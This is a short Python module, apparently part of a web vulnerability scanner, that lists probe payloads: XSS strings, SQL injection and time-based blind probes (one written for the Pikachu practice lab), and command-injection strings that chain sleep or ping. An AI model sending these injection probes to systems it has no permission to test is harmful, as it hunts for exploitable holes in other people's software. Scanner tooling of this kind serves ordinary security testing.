# core/payloads.py
"""
Payload 资源（XSS / SQLi / CMD）。

v1.2.3 新增：
    - SQLI_TIME 加 Pikachu 专用盲注 payload（vince' AND SLEEP(5)#）
"""

XSS_MARKER = "xSc"

PAYLOADS = {
    "XSS": [
        f"<script>{XSS_MARKER}alert(1)</script>",
        f"\"><script>{XSS_MARKER}</script>",
        f"<img src=x onerror={XSS_MARKER}=1>",
        f"javascript:{XSS_MARKER}:alert(1)",
    ],
    "SQLI": ["'", "\"", "')", "';", "\\"],
    "SQLI_TIME": [
        "' OR SLEEP(5)#",
        "\" OR SLEEP(5)#",
        "1' AND SLEEP(5)#",
        "1) OR SLEEP(5)#",
        "'||(SELECT SLEEP(5))||'",
        "vince' AND SLEEP(5)#",       # ★ v1.2.3：Pikachu sqli_blind_t 专用
    ],
    "CMD_LINUX": [
        ";sleep 3;",
        "|sleep 3",
        "&&sleep 3",
    ],
    "CMD_WIN": [
        "|ping -n 4 127.0.0.1",
        "&ping -n 4 127.0.0.1",
        "&&ping -n 4 127.0.0.1",
    ],
}